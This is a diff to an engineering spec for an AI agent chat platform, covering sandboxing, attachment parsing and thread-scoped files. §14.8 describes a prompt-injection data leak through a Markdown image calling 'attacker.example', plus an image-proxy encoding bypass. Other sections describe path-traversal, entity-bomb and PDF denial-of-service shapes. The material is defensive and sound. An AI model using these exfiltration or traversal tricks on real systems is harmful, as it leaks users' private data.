@@ -20,7 +20,18 @@ saves, §21.10) was built 2026-09-29. H-204 (a box timer runs the smoke,
 artifact routes, §21.14), part 3 (a tenant dir for a shared agent,
 §21.15) and part 4 (a per-run artifact context, §21.16) were built
 2026-09-30. The owner answered the three
-questions of §12 on 2026-09-29 (D-PM-35 accepted, D-PM-40 decided).** §10 says which slice each part belongs to. §4.4 lists what the chat reuses, file by file.
+questions of §12 on 2026-09-29 (D-PM-35 accepted, D-PM-40 decided).
+D85 reverses O1 of S7e on 2026-10-03: code over member data runs only in
+the sandbox, and until then projects-assistant holds no `run_script` and no
+`code_task` (§13.7). WS-43u (D86) built the instructions for code on
+2026-10-04, dark: a run that holds `run_command` reads the sandbox rules,
+and a run without it keeps the ban (§13.7). H-229 (chat attachments, read
+on the platform, §22) was built 2026-10-04: projects-assistant reads an
+attached `.docx`, PDF or text file again, and no code runs. The security
+fix of §14.8 (a remote image in agent Markdown loads only on a click) was
+built and deployed on 2026-10-04 (PR #618). H-227 (§22.9) was built
+2026-10-04, in review: the uploads and the S8 documents of the chat are
+private to their thread.** §10 says which slice each part belongs to. §4.4 lists what the chat reuses, file by file.
 
 The design was verified against the tree on 2026-09-22. Every "already
 there" claim was re-derived from the code, not from a write-up. Each anchor
@@ -423,6 +434,11 @@ read.** `PlanCard` and `ReportCard` are S4, `ActionResultCard` is S2.
 | `formCard` (template) | `edit_task`, `edit_project` | Submits the edited fields back to the tool |
 | `ActionResultCard` | Every write | Says what changed, links the row. A done class C act wears the warning tone, and every other done write wears success. `GUARDED_TOOLS` names the class C tools, and `test_the_cards_know_every_guarded_tool` holds it equal to the manifest. Built 2026-09-23 |
 
+**Since 2026-10-08, a read's card draws inside its step.** The cards above
+for a READ open from the working trail, and never draw after the answer. Only
+a write's receipt and a failed view draw in the flow. §24 is the rule of
+record.
+
 **The generic card is the default.** A tool the card file does not know
 renders as `ActionResultCard` from its class. A new tool never renders as
 raw text, and it never needs a card file change to ship. §7.3 depends on this.
@@ -648,6 +664,10 @@ So a pull request that adds a Projects endpoint fails CI until its author
 decides what the chat does with it. The decision costs one line. The fence
 is R7's answer to "continuously update".
 
+**Extended by D91, decided 2026-10-06.** `projects_agent_parity.md` §6
+takes this rule from the route to the request field and to the UI client
+method. That spec owns the extension.
+
 ### 7.2 The persona and the instructions come from code
 
 The agent's instruction file names workflows and rules. It does not list
@@ -735,6 +755,7 @@ Each slice is one pull request. Each one is useful alone.
 | **S13 · Message integrity** — ✅ **BUILT 2026-09-28** | Only the run changes an agent reply, and the fold seals it · no client updates a system row · a declined write names its ids in unchanged · one migration, run_member_email and run_final_at (§19) | AGENT-SAFE |
 | **S14 · No forged agent rows** — ✅ **BUILT 2026-09-28** | The server mints the agent row of a run when the run starts · no client inserts an agent row or a system row · an empty minted row stays hidden · a creator owns only a room with no rows, and migration 221 backfills every creator's owner row (§20) | AGENT-SAFE. D-PM-39 decided by the owner 2026-09-28 |
 | **S15 · Chat is saved on production** — ✅ **BUILT 2026-09-29** | A JSON body to the gateway names its content type, so a save gets no 422 · each chat, room, fold, mint, run-trace and blob write binds the tenant · `_load_room` binds it too, so no member owns a room that they cannot see · an empty server answer keeps the browser cache · an R8 suite, a smoke check and an alarm (§21) | AGENT-SAFE. A live defect, audited by the diagnosis of 2026-09-29 |
+| **H-229 · Chat attachments** — ✅ **BUILT 2026-10-04** | `read_attachment` reads the text of a `.docx`, PDF, `.txt`, `.md` or `.csv` file attached in this chat, by pure parsing · an upload to a shared agent lands in its thread's own folder · an older flat upload reads only in the thread that the blob history names (§22) | AGENT-SAFE. Restores the flow that D85 stopped |
 | **Flip** | `NEXT_PUBLIC_PROJECTS_CHAT` on the box | `enforcement-flip`, granted until 2026-11-30 (`.claude/OWNER_GRANTS.md`, PR #487) |
 | **Delete** | `delete_project`, `delete_task` from class X to C | Blocked on WS-40 |
 
@@ -1612,6 +1633,20 @@ three product decisions were open. The owner answered all three on
   `write_artifact`, `run_script` and `code_task` over the dataset rows. **This
   fence is ADVISORY** (R7). Those three are floor tools, and a tool scope
   cannot remove them. No test can stop the model from calling them.
+  **⚠️ D85 reverses O1 (owner, 2026-10-03).** Code that the Projects agent
+  writes may work on the project and task data that the asking member can
+  already see. That code runs only in the sandbox container of the
+  organization, with no network (`maf_coding_engine.md` §7.9). The HR-only
+  fields stay gated, as O3 says. Until the sandbox covers projects-assistant,
+  the agent holds no `run_script` and no `code_task`. So WS43-F23 now
+  ENFORCES that half of the fence. The `write_artifact` half stays ADVISORY.
+  **WS-43u (D86) changed the instructions on 2026-10-04.** A run that holds
+  `run_command` reads the section "Code in the sandbox"
+  (`acb_skills/addendum.py`, `maf_coding_engine.md` §16.3). The section
+  comes before the ban. A run without `run_command` keeps the ban, which
+  now names no withheld tool. The owner kept delegation in such a run on
+  2026-10-03, so the sandbox has no network, but an agent that the run calls
+  runs outside it. Since H-236 (2026-10-04), that agent gets no egress tool.
 - **O2 · The server groups the data.** The route takes an optional `group_by`
   from an allowlist and a `measure` from an allowlist. The server returns
   exact figures. The model picks figures and explains them. It never adds
@@ -1636,7 +1671,8 @@ owner's answers. They follow the S7c and S7d precedent.
    `task_dataset` in `reads.py`, with the manifest row
    `Route("GET", "/projects/analytics/dataset", "task_dataset", "A")`. The
    tool writes nothing. The instructions forbid `write_artifact`,
-   `run_script` and `code_task` over its rows (ADVISORY, O1).
+   `run_script` and `code_task` over its rows (ADVISORY, O1). Since D85 the
+   injection seam enforces the `run_script` and `code_task` half (O1).
 2. **The scope is Load's or Throughput's, never a third.** `state=open` is
    exactly `load_open_where` plus `load_params`. That carries the D-PM-32(b)
    stopped-project exclusion. `closed` and `all` use Throughput's scope
@@ -2043,6 +2079,63 @@ table and long code line scrolled with a 10px bar. **A capture rig must show
 scrollbars.** Playwright's headless Chromium starts with `--hide-scrollbars`,
 so a capture shows no bar even where the box scrolls. Pass
 `ignoreDefaultArgs: ["--hide-scrollbars"]` before you judge a scroll box.
+
+### 14.8 A remote image loads only on a click (security fix, 2026-10-04)
+
+**The threat.** An attacker can steer the text of an agent's reply. A prompt
+injection in an email, a web page, a file or a task can make the agent write
+`![](https://attacker.example/p.png?d=<member data>)`. Before this fix, the
+bubble drew that image at once, and the browser sent the data out. No tool
+ran and no card showed.
+
+**The rule.** A Markdown image whose URL leaves the app's origin does not load
+when it renders. It draws as a placeholder with the alt text, the host and a
+"Load image" button. Only the member's click loads it. A `data:` image and a
+same-origin or workspace path load at once.
+
+**One gate.** `src/lib/markdownMedia.ts` decides, and
+`src/components/MarkdownImage.tsx` draws. Every renderer of agent Markdown
+uses them: `MarkdownBody`, `ThinkingContainer`, `ArtifactViewerModal` and
+`DocumentPane`.
+
+**A same-origin URL can still send the data out.** `/api/email/image-proxy?url=`
+fetches any public URL on the server. A proxy route with a catch-all path
+decodes each segment, so `/api/email/image-proxy%3Furl=…` reaches the gateway with a real
+query. So the gate treats these same-origin URLs as remote:
+
+- a URL whose query names another URL
+- a URL whose decoded path holds a `?`, a `#`, a backslash or another URL
+- every `/api/` path except the workspace file proxy that `resolveMediaSrc`
+  builds
+
+**Raw HTML.** `ArtifactViewerModal` and `DocumentPane` run `rehype-raw`, and
+`rehypeGateRemoteMedia` runs after it. It removes `script`, `style`, `link`,
+`meta`, `base`, `title`, `template`, `iframe`, `object` and `embed`. It strips
+each URL attribute that the gate treats as remote, for example `src`, `srcset`,
+`poster` and `background`.
+
+**CSS fetches.** The gate also strips each attribute that holds a CSS fetch:
+a `url()` that is not a fragment, an `image-set()`, or a CSS escape. That
+covers `style`, the SVG presentation attributes such as `mask` and `fill`,
+and the SMIL values.
+
+**No forms.** A form inside the app's origin is a credential phish that needs
+no script. So the gate removes `form`, `input`, `button`, `select`,
+`textarea`, `option`, `fieldset`, `legend` and `label`, with their content. It
+keeps one shape: the disabled checkbox that remark-gfm draws for a task list.
+It strips `action`, `formAction`, `ping` and `autoFocus` from every element.
+The email sanitizer forbids `form` and `ping` for the same reason.
+
+Before this fix, an agent `.md` file with `<script async src>` ran that script
+in the app's origin. React 19 hoists an async script and loads it. An
+email attachment opens in the same viewer. The raw-HTML gate is a block list,
+so a new vector is a new case in the plugin and in its test.
+
+**Fences.** `src/components/markdownImage.test.ts` and
+`src/lib/markdownMedia.test.ts`. A source scan in the first file also fails when
+a new `react-markdown` renderer skips `MarkdownImage`, `markdownUrlTransform` or
+the raw-HTML gate. The app sends no CSP that limits `img-src`. H-238 holds that
+follow-up.
 
 ---
 
@@ -4049,6 +4142,14 @@ fault-in reads the blob row. The rules that follow come from that path.
 
 `test_an_old_document_opens_for_its_own_tenant_only` proves the first two.
 
+✅ **H-227 narrows the first rule to the thread (2026-10-04, §22.9).** A
+document of the Projects chat now goes to its thread's own folder,
+`outputs/<thread slug>/`, and only a session of that thread lists or opens
+it. A document from before H-227 lies in the flat `outputs/`. Its old link
+opens only for the session that the blob history shows wrote those bytes.
+The row can be the tenant row or the older `''` row. Any other member of
+the tenant gets 404, and the fault-in writes nothing for them.
+
 **The email follow-ups of the part 2 review.**
 
 1. (P1) `load_artifact_attachments` fails closed. One refused ref fails the
@@ -4290,3 +4391,1043 @@ uv run pytest tests/unit/test_h201_run_context.py \
 ```
 
 The `-rs` output must show no skip.
+
+### 21.17 A document of a delegated agent opens in the chat that asked
+
+**Status: BUILT 2026-10-05.** A live bug, found in the gateway log.
+
+**The defect.** A member asked the Projects chat for a project brief from
+the Welmont School emails. projects-assistant called email-assistant with
+`call_agent`. email-assistant is a personal agent, so its sub-run works in
+the `u:<member>` dir of the member (§21.16, P2-c). Its `write_artifact`
+wrote the brief into that dir. The card showed in the Projects chat, and its
+link named the session of that chat. The session route serves that link
+from the working dir and the thread folder of the chat. So Open, Download
+and PDF answered 404.
+
+**The fix.** The run boundary of a delegated run binds `deliver_to`. It
+holds four values of the chat that asked: the working dir, the store key,
+the agent and the session. `write_artifact.delegation_target` reads them
+from the parent's bound context, and from nothing else (R5). The target of
+a delegated parent passes on, so a grandchild delivers to the chat at the
+top. A batch run is no target, so its sub-run keeps its own dir.
+
+| Tool of the delegated run | What it does now |
+|---|---|
+| `write_artifact`, a path in `outputs/` or in no folder | Writes into the thread folder of the chat (H-227). The card, the link and the blob row name the chat. |
+| `write_artifact`, a path that resolves anywhere else in the chat's dir | Refuses. A file in `inputs/` reads as an upload of the member, and `agent-data/` is the memory of the chat's agent. |
+| `write_artifact`, a path in `agent-data/` | Writes into the dir of the sub-agent, as before. It shows no card and no link, because no chat can open that dir. |
+| `share_artifact` | Copies a file of the sub-agent's own `outputs/` into the thread folder of the chat, and shows the copy. The same bytes again use the same copy. It refuses a file of its `agent-data/` and a dotfile, because in a room every member reads what the chat holds. |
+| `save_note` | No change. A note is the memory of the sub-agent, and it shows no card. |
+
+**Why the write uses the safe opener.** The sandbox container of a covered
+chat mounts the thread folder at `/workspace/outputs`, read-write. The
+container can put a link there. So the delivered write opens each part with
+`acb_skills.safe_open`, and a link at any depth stops the write. The next
+`run_command` of the chat sees the brief at `/workspace/outputs/reports/…`.
+
+**The path rule (fix round 1).** The first version checked the head of the
+input string, before the path resolved. So `outputs/../inputs/brief.pdf`
+passed, resolved into the upload folder of the chat, and replaced the
+member's upload with `overwrite=True`. Now the rule refuses a `..` or `.`
+part, a NUL, a drive and a `:` before any resolve. Then the rule reads the
+RESOLVED, thread-scoped path, and only `outputs/` passes.
+
+**The lock and the quota (fix round 1).** A delegated write holds the
+broker's dir lock of the chat's working dir (`SandboxBroker.host_dir_of`).
+The chat's own file tools and every container on the dir take that lock too.
+While a container on that dir is over its quota, the write refuses, as
+`TenantFileStore.write` does. The reuse check compares the size before
+it reads a file of the chat.
+
+**Option (b), not taken.** The event could name the dir of the sub-agent,
+and the route could serve from it. Then one link has two possible sources,
+and a chat session then reaches the dir of one member. The tree, the history, the
+fault-in and the container would each need the same rule. Option (a) keeps
+one dir for each chat.
+
+**Acceptance.** `tests/unit/test_delegated_artifact_card.py`. Its R8 half
+runs on the phase 4 catalog as the NOBYPASSRLS app role.
+
+- The real executor runs a covered projects-assistant chat that calls
+  email-assistant (the MAF path). The brief lands in the thread folder of
+  the chat, and the card names the chat. A Copilot sub-agent does the same.
+- The link of the card answers 200, and its PDF form too, for the member
+  who asked. It answers 404 for another member of the organization. With
+  the disk copy gone, the fault-in restores it for that member only.
+- With no `deliver_to`, the same write gives the 404 of the bug.
+- A run that nobody delegated writes where it always did.
+
+**Mutations.** Each one fails at least one test of the suite.
+
+| Mutation | Tests that fail |
+|---|---|
+| `write_artifact` ignores `deliver_to` | 7 |
+| `share_artifact` ignores `deliver_to` | 1 |
+| `delegation_target` passes on no inherited target | 2 |
+| the batch path binds no `deliver_to` | 1 |
+| the Copilot sub-agent drops `deliver_to` | 2 |
+| the blob row names the sub-agent, not the chat | 3 |
+| the delivered write follows a link | 1 |
+| a batch parent is a target too | 1 |
+| both `..` refusals removed (fix round 1) | 1 |
+| the head check on the resolved path removed | 3 |
+| the first rule put back: the head of the input string, no `..` refusal | 6 |
+| a delegated share takes any file of its dir | 1 |
+| a delegated share takes a dotfile of its `outputs/` | 1 |
+| the dir lock not taken | 1 |
+| the quota ignored | 1 |
+| the reuse check reads before it compares the size | 1 |
+
+**Verification.**
+
+```bash
+eval "$(bash scripts/dev_db.sh --export)"
+uv run pytest tests/unit/test_delegated_artifact_card.py \
+  tests/unit/test_h227_thread_scope.py tests/unit/test_delegation_no_egress.py -q -rs
+```
+
+The `-rs` output must show no skip.
+
+## 22. Chat attachments, read on the platform (H-229)
+
+**Status: BUILT 2026-10-04.** HANDOFF H-229. D85 (`maf_coding_engine.md`
+§7.9). The audit read the code at `main` `0711c8b3`.
+
+### 22.1 The answer
+
+D85 took `code_task` from every shared agent on 2026-10-03. On 2026-10-02
+and 2026-10-03, the projects-assistant of a customer org used `code_task` on
+the production host to read a member's `.docx`. D85 stopped that flow.
+
+`read_attachment` gives the flow back, and no code runs. The tool parses the
+file in the gateway process and returns its text. projects-assistant holds
+it in its `tool_scope`.
+
+### 22.2 What was already there
+
+- The rail draws the shared `AgentChat`. Its paperclip is
+  `FileUploadButton`, which posts to `POST /api/agent/workspace/{sid}/upload`.
+  The Next route sends the files to the gateway route of the same name.
+- The gateway route wrote each file to `inputs/` of the session's workspace.
+  For projects-assistant, that workspace is the tenant dir of §21.15. Every
+  member of the org shares that dir. So one member's upload lay in a folder
+  that each session of the agent could read. That is a gap in D12.
+- The browser tells the agent about a file in the next message: "📎 Uploaded
+  … You can read them with the read_file tool". No `read_file` tool exists.
+  So the agent read the file through `code_task`.
+
+### 22.3 What H-229 builds
+
+1. **One path rule.** `acb_skills.agent_paths.upload_dir_rel(instance,
+   thread_id)` gives `inputs/<thread slug>/` in a tenant dir. Every other
+   workspace keeps `inputs/`. The thread slug is `thread_slug(thread_id)`,
+   the ONE slug function. WS-43d builds `outputs/<thread slug>/` on it
+   (`thread_outputs_rel`, `maf_coding_engine.md` §16.3). The upload route
+   writes there, and the tool reads there.
+2. **One tool.** `acb_skills.attachment_tools.read_attachment(name,
+   offset=0)`. The run's artifact context gives the workspace and the
+   thread. The model gives a file name only.
+3. **One parser module.** `acb_skills.attachment_text` reads `.docx`,
+   `.pdf`, `.txt`, `.md` and `.csv`. The standard library reads a `.docx`
+   as a zip of XML. `pypdf` reads a PDF.
+4. **The agent.** The `tool_scope` of projects-assistant names
+   `read_attachment`. The Files section of `instructions.md` tells the
+   model to use it. The new skill family `attachments` holds the tool, and
+   `tool_annotations` marks it read-only.
+5. **One dependency.** `acb-skills` adds `pypdf>=6.19`, which is pure
+   Python. `uv.lock` adds `pypdf` and no other package. A `.docx` needs no
+   new package.
+
+### 22.4 Rules
+
+1. **No code runs.** The tool parses bytes, and it starts no process. The
+   one subprocess in `pypdf` runs `jbig2dec` for a JBIG2 stream. Each parse
+   sets `jbig2dec_binary=None`, so that path is off.
+2. **The caps.** A file has at most 25 MB, the upload cap. A `.docx` reads
+   one part, the main document, and at most 20 MB of it once unpacked. A
+   PDF reads at most 100 pages. One PDF stream unpacks to at most 1 MB, and
+   one page enters a form XObject at most 100 times. A text file keeps
+   5,000 lines. One call returns 40,000 characters, and a longer file gives
+   the offset of the next page.
+3. **A deadline that stops a parse in the middle** (fix round 1). A parse
+   stops itself after 20 seconds. A PDF checks it before each operator,
+   through pypdf's `visitor_operand_before`, also inside a page. pypdf parses
+   a whole stream before the hook runs, so a stop comes at most one stream
+   parse late: about 0.6 s at the 1 MB cap, and 0.81 s at most in the
+   measured cases. Rule 3d bounds the font setup that runs before the first
+   operator. A Word part checks the deadline between 64 KB chunks and every
+   1,024 elements. The proof is a real slow page, the reviewer's one-page PDF
+   (`test_a_slow_single_page_pdf_stops_at_the_deadline`).
+3a. **Why not a child process.** A child process with a hard kill was the
+   other choice. The in-thread hook bounds the time, so the parse stays in
+   the process, and the "no process" rule and its trap test hold as they are.
+3b. **A Word part is UTF-8, and has no DTD** (fix round 1). A UTF-16 part
+   once hid its DTD from a byte search, and its entities grew to about 2 GB.
+   Now the tool refuses a part with another encoding before the parse. The
+   parser (`pyexpat`) decodes the part as UTF-8, and it refuses a DTD and an
+   entity declaration at the first event. `_rels/.rels` goes through the
+   same parser. The parse keeps no tree, and each element costs O(1).
+3c. **A Word part has a depth cap and an element cap** (fix round 1). expat
+   keeps one entry for each open element. So 2.4 million nested empty
+   elements, 17 MB of XML under the part cap, once peaked at 343 MB. Now the
+   parser refuses a part with more than 256 open elements, or with more
+   than 1,000,000 elements. That part now peaks at about two copies of its
+   XML.
+3d. **The font setup of a PDF page has caps** (fix round 2). pypdf builds
+   every font entry of a page, and of each form it enters, before the first
+   operator. The deadline hook does not run there, and pypdf parses each
+   entry's ToUnicode CMap again, with no cache. So 1,000 entries that share
+   one 285 KB CMap once ran 92 s past a 3 s deadline. Before each page the
+   tool walks the page's resources and those of every form it can reach,
+   and refuses the file when one dictionary has more than 64 font entries,
+   or more than 2 MB of font program bytes. A shared CMap counts once for
+   each entry, as pypdf parses it.
+   - Why 64: real pages hold 2 to 40 fonts (LaTeX math about 25, office
+     documents about 10). 64 entries that share one font with 65,000
+     widths take 0.95 s, inside pypdf's own cap of 100,000 widths.
+   - Why 2 MB: pypdf parses a CMap at about 3 MB/s (285 KB in 0.094 s), so
+     the font setup of one dictionary takes under 1 s.
+3e. **A stop inside a form on the last page** (fix round 2). pypdf drops the
+   error that the deadline raises inside a form. With no page operator after
+   the form, the page ends with no error. So the deadline keeps a flag, and
+   the loop reads it after every page, the last one too. With fewer than 200
+   characters read, the tool refuses the file. With more, the text comes back
+   marked `stopped`.
+3f. **The parses never use the shared thread pool** (fix round 2). A parse
+   past its deadline keeps its thread. So the parses run on a pool of two
+   threads of their own, and the file reads on another small pool, never on
+   the gateway's default pool, which every `asyncio.to_thread` of every org
+   uses. A parse holds its slot until its worker really ends. The tool waits
+   2 seconds past the deadline and then answers, but the slot stays held. So
+   at most two parse threads ever live, and a third call gets "Another file
+   is being read now" at once.
+4. **A zip bomb costs no more than the cap.** A part that declares more
+   than 20 MB is refused before it is opened. A part that hides its size
+   unpacks no more than the read asks for, which is the cap plus one byte.
+5. **A clean refusal.** Each failure gives one sentence for the member. No
+   parser exception reaches the model.
+6. **This chat only (D12).** The tool keeps only the last part of the
+   name. So a path into another thread's folder, or a `..` climb, reads
+   this thread's folder.
+7. **The safe opener.** The tool opens each file and lists each folder
+   through `acb_skills.safe_open`, the one opener of a dir that a sandbox
+   may mount (`maf_coding_engine.md` §7.5 rule B). A link at any depth, also
+   one that appears during the call, reads as absent. So does a file that
+   is not a regular file. The upload route writes through the same opener.
+8. **A covered run** (WS-43d). When `covers()` is true for the run, the
+   read holds the broker's dir lock, `host_dir()`, as the sandbox file tools
+   do. So no exec of a container runs during the read. The parse runs after
+   the tool releases the lock. The tool is not in `WITHHELD_HOST_TOOLS`, so
+   a covered run keeps it.
+9. **No marker.** A container can rewrite the `.cc-instance` marker of the
+   dir that it mounts. So the tool takes the store key from the run's
+   artifact context. The upload route tells a tenant dir from its path and
+   the caller's tenant, as `_own_thread_slug` does. The route refuses a
+   thread id that names no folder with 400, and it writes no file.
+10. **An older upload.** A file in the flat `inputs/` reads only when the
+    blob history shows that this session uploaded those bytes. The row must
+    say `create`, `user`, this `session_id` and the same sha256.
+11. **The text is data.** The tool output says so, and the instructions
+    say so.
+12. **A bounded load.** At most two parses run at a time in the process,
+    each on the tool's own pool (rule 3f). A third call gets "Another file is
+    being read now".
+
+### 22.5 Acceptance
+
+Each item has a test in `tests/unit/test_read_attachment.py`.
+
+1. A real `.docx`, a real PDF, `.txt`, `.md` and `.csv` give their text.
+2. A file over the cap, a zip bomb, a DTD in a Word part, a password PDF
+   and a malformed PDF each get a clean refusal.
+3. A trap on every process call stays empty for every kind. A JBIG2 page
+   reaches `jbig2dec` in plain `pypdf`, and never through the tool.
+4. A colleague's upload in the same org is refused, also through a path or
+   a `..` climb. The R8 test uploads through the real route as one member,
+   and reads as another member of the same org.
+5. An older flat upload reads only in its own thread, on the real store
+   as the NOBYPASSRLS app role.
+6. The real request body of projects-assistant carries `read_attachment`
+   and no shell tool. The tool result in the next request carries the text.
+7. The golden trajectory `evals/trajectories/test_attachment_scope_trajectory.py`
+   locks the thread rule offline.
+8. A covered run, through the real executor with `covers()` true, reads its
+   own attachment while it holds the dir lock. A path into a colleague's
+   thread folder reads nothing. `WithholdHostTools` and `RefuseHostTools`
+   keep the tool.
+9. A rewritten marker moves no upload out of its thread, and opens no flat
+   file for the tool. A thread id that names no folder gets 400 (R8).
+10. Fix round 1. The reviewer's one-page PDF stops within 2 seconds of a
+    1-second deadline, and its slot is free afterwards. A parse that runs
+    on loses its slot at the deadline. The tool refuses entity bombs in
+    UTF-8, UTF-16 with and without a BOM, and UTF-32 in under 1 second,
+    under 8 MB. It refuses a part that is not UTF-8, and a DTD in
+    `_rels/.rels`. It refuses 30,000 nested paragraphs in under 1 second. A
+    clip in the last PDF page, or in a Word paragraph, sets `stopped`.
+11. The verifier's shapes. A part of 2.4 million nested empty elements, and
+    a flat part of 4.5 million empty elements, are refused under 48 MB of
+    peak memory. The UTF-16 internal entity "INJECTED BY DTD" never reaches
+    the text, also through the tool. With the UTF-8 check taken away, the
+    parser still refuses it.
+12. Fix round 2. The tool refuses a page with 100 font entries, and the
+    reviewer's file of 40 entries that share one 285 KB CMap, within half a
+    second of a 1-second deadline. The tool refuses the same entries inside
+    a form. A stop that pypdf drops inside the last form is refused, and
+    after real text it comes back marked `stopped`. Two runaway parses hold
+    both slots, a third call is refused at once, and the default pool runs
+    no job of the tool.
+
+### 22.6 Mutations
+
+Each mutation below turns at least one test red.
+
+| Mutation | Tests that fail |
+|---|---|
+| a table row is dropped | 1 |
+| no size cap in `extract_text` | 1 |
+| no size check before the tool reads | 1 |
+| no declared-size check in a `.docx` | 1 |
+| an unbounded read of the main part | 1 |
+| a pypdf error escapes | 3 |
+| the parser takes a DTD | 1 |
+| no thread folder in a tenant dir | 3 |
+| the name keeps its path | 1 |
+| the history ignores the session | 2 |
+| `jbig2dec` stays on | 1 |
+| a parse starts a process | 3 |
+| the scope loses the tool | 2 |
+| D85 counts it as a shell tool | 2 |
+| no parse slot | 1 |
+| a covered run takes no dir lock | 1 |
+| a plain open in place of the safe opener | 1 |
+| WS-43d withholds `read_attachment` | 2 |
+| the tool reads the marker | 1 |
+| the upload route reads the marker | 1 |
+| the upload route writes the flat `inputs/` | 2 |
+| an odd thread id falls back to `inputs/` | 1 |
+| fix round 1: the PDF page has no deadline visitor | 1 |
+| fix round 1: pypdf's own cap of 5,000 form entries | 1 |
+| fix round 1: the old 8 MB stream cap | 1 |
+| fix round 1: no UTF-8 check | 3 |
+| fix round 1: any encoding, a DTD and no UTF-8 check | 4 |
+| fix round 1: the package relationships skip the safe parser | 1 |
+| fix round 1: no depth cap | 2 |
+| fix round 1: no element cap | 1 |
+| fix round 1: the parser takes a DTD and the declared encoding | 1 |
+| fix round 1: all three Word guards gone | 6 |
+| fix round 1: no deadline inside a chunk | 1 |
+| fix round 1: a PDF cut in its last page reads as whole | 1 |
+| fix round 1: a cut Word paragraph reads as whole | 1 |
+| fix round 1: the instructions say there is no file tool | 1 |
+| fix round 2: the parse runs on the default pool | 2 |
+| fix round 2: the reads run on the default pool | 1 |
+| fix round 2: the slot frees at the timeout | 1 |
+| fix round 2: no font entry cap | 1 |
+| fix round 2: no font byte budget | 1 |
+| fix round 2: the font walk skips forms | 1 |
+| fix round 2: no font walk at all | 2 |
+| fix round 2: no check of the deadline flag after a page | 1 |
+| fix round 2: a page that the deadline cut reads as whole | 1 |
+
+Two mutations stay green, each because a newer guard covers the same
+case:
+
+- The deadline check between two PDF pages is a second layer, because the
+  visitor checks first. The visitor mutation stands for it.
+- The quadratic close of a paragraph is harmless now. The depth cap and
+  the paragraph cap bound the open paragraphs, so the depth-cap mutation
+  stands for it. The close stays O(1).
+
+Fix round 2 changed one rule, so one fix-round-1 mutation is gone: "the
+slot frees only when the worker ends" is now the rule, and "the slot frees
+at the timeout" is the mutation that turns red.
+
+`_docx_text` reads the whole zip central directory before it checks
+`MAX_ZIP_ENTRIES`. The 25 MB file cap bounds that read, so it stays.
+
+### 22.7 What H-229 does not do
+
+- It reads no `.xlsx`. HANDOFF H-235 carries it.
+- A `.docx` read covers the main body, its tables included. It does not read
+  the headers, the footers, the footnotes or the comments.
+- A scanned PDF has no text layer, so it reads as pages with no text. The
+  tool runs no OCR.
+- ✅ H-227 closed this gap on 2026-10-04 (§22.9). Before it, only this tool
+  kept to the thread folder of `inputs/`. The workspace routes, the sandbox
+  file store and the container mount reached the `inputs/` folder of another
+  thread.
+- The browser message still names `read_file`. The instructions name the
+  right tool.
+- A team agent keeps the flat `inputs/`.
+
+### 22.8 Verification
+
+```bash
+eval "$(bash scripts/dev_db.sh --export)"
+uv run pytest tests/unit/test_read_attachment.py \
+  tests/unit/test_h201_tenant_workdirs.py \
+  tests/unit/test_projects_sandbox_tools.py \
+  evals/trajectories/test_attachment_scope_trajectory.py -q -rs
+```
+
+The `-rs` output must show no skip, except the Windows-only skips of the
+sandbox suite.
+
+### 22.9 H-227 — the uploads and the documents of one thread
+
+**Status: BUILT 2026-10-04, in review.** HANDOFF H-227. It is a
+prerequisite of the owner flip WS-43w (`maf_coding_engine.md` §16.3).
+
+**The gap.** Every session of projects-assistant in one organization opens
+the same tenant dir (§21.15). After H-229, two gaps in D12 stayed open.
+
+1. `write_artifact` put an S8 document in the shared `outputs/`. So any
+   member of the organization could list and open it from a session of
+   their own.
+2. An upload went to `inputs/<thread slug>/` (§22.3). But the workspace
+   routes, `TenantFileStore` and the container still reached the upload
+   folder of another thread.
+
+**What H-227 builds.**
+
+1. **One slug rule, one folder rule.** `agent_paths.thread_slug` names both
+   folders of a thread, through `thread_outputs_rel` and the new
+   `thread_inputs_rel`. `upload_dir_rel` builds on it. `is_other_thread_rel`
+   now covers `inputs/` and `outputs/`. So each reader and writer that asks
+   it refuses the upload folder of another thread too. `is_loose_rel` names
+   a file in `inputs/` or `outputs/` but in no thread folder.
+2. **The S8 documents.** In a tenant dir, `write_artifact` puts `outputs/x`
+   in `outputs/<thread slug>/x` and `inputs/x` in `inputs/<thread slug>/x`
+   (`thread_scoped_rel`). The card and the link name that path. A thread id
+   that names no folder writes nothing. `share_artifact` reads a path the
+   same way, and it shows no loose file.
+3. **The routes.** The tree, file, history, PUT, DELETE and promote routes
+   apply the rule to a session of a shared agent. They serve it only the two
+   folders of its thread. The room check of today stays.
+4. **The old links.** A loose file opens only for the session that wrote
+   it (rule 2).
+5. **The file store.** `TenantFileStore` maps `inputs/` to
+   `inputs/<thread slug>/`, as it maps `outputs/`.
+6. **The container.** The broker mounts `inputs/<thread slug>/` at
+   `/workspace/inputs/`, read-only, over the shared `inputs/`.
+7. **One filter.** `acb_memory.file_history` takes a `session_id`, so the
+   routes read only the rows of the session.
+
+**Rules.**
+
+1. **The run or the path names the tenant dir.** `write_artifact` takes the
+   store key `o:<org>` and the thread from the run. The routes tell a tenant
+   dir from its path and the caller's tenant. Nothing reads the
+   `.cc-instance` marker.
+2. **The history rule of a loose file** (`workspace._session_wrote`). The
+   session must have begun the path. Its row is the oldest row there that
+   writes bytes. One of its rows must also name the sha256 of the bytes on
+   disk. So ownership never moves to a second session (fix round 1). An
+   upload, an edit and a document of the run all count. `read_attachment`
+   keeps its narrower form of the rule, an upload only (§22.4 rule 10).
+3. **Both store keys.** The routes read the tenant key `o:<org>` and the
+   older `''` rows of the tenant (§21.15), in the caller's tenant.
+4. **The fault-in checks first.** For a loose file, it checks the stored
+   bytes before it writes them. A refused file never reaches the disk.
+5. **One answer.** A loose file of another session, a new loose path and a
+   folder of another thread all answer 404. So no answer tells a member
+   which loose file exists.
+6. **The history route.** A row of a loose file shows only to its writer,
+   when that session began the path.
+7. **A personal agent keeps its flat folders.** Its dir holds only the files
+   of its member.
+8. **A batch document belongs to the organization** (the supervisor's
+   decision of 2026-10-04, which the owner may reverse). A batch run has no
+   chat. Examples are a workflow node, a run with no thread, and a task that
+   a member assigns to an agent. `write_artifact` in such a run writes the
+   flat `outputs/`, as before H-227. Its history row has the actor `batch`.
+   Only the executor marks a batch run (`batch_thread`). It does so when it
+   mints the thread `<agent>:<run id>` itself, with no parent run bound. A
+   thread id from a client never marks a batch run. Every member lists,
+   opens and reads the history of such a file. Nobody changes, deletes or
+   promotes it. A batch run never replaces an existing file. A name is
+   free only when the disk and the history hold nothing there. One
+   exclusive create takes it (fix round 2). The purge of a
+   deleted chat never touches a batch row.
+   A batch document from before H-227 has a row with the actor `agent` and
+   the session `<agent>:<run id>`. That exact form is a batch row too (fix
+   round 3). No new chat can take an id with a colon, so no chat can forge
+   it.
